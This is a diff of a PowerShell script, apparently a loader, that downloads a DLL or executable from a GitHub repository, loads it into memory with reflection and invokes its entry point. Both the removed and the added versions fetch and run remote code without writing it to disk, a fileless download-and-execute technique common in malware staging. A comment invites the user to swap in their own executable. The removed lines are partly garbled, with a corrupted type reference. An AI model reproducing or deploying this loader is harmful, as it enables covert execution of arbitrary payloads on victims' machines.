@@ -1,21 +1,8 @@
-$dllUrl = "https://github.com/imreallyemo1337/KUTTHROATVONSECRETGITHUBREPO/raw/main/chxpo.dll"
 
-# Download the DLL to a byte array
-try {
-    # Download the DLL to a byte array
-    $fileData = (New-Object System.Net.WebClient).DownloadData($dllUrl)
+$downloadUrl = "https://github.com/imreallyemo1337/KUTTHROATVONSECRETGITHUBREPO/raw/main/test.exe"  # Replace with the link to your C# executable
 
-    # Load the assembly into memory
-    $assembly = System.Reflection.Assembly (http://ystem.reflection.assemblyy/)::Load($fileData)
+$assemblyBytes = Invoke-WebRequest -Uri $downloadUrl -UseBasicParsing
+$assembly = [System.Reflection.Assembly]::Load($assemblyBytes.Content)
 
-    # Get the main entry point (i.e., main method) of the assembly
-    $entryPoint = $assembly.EntryPoint
-
-    # Invoke the main method
-    if ($entryPoint -ne $null) {
-        $entryPoint.Invoke($null, @())
-    }
-} catch {
-    # Print error message if the DLL fails to load
-    Write-Host "Failed to load the DLL: $($.Exception.Message)"
-}
+$entryPoint = $assembly.EntryPoint
+$entryPoint.Invoke($null, (, [string[]] ('foo', 'bar')))
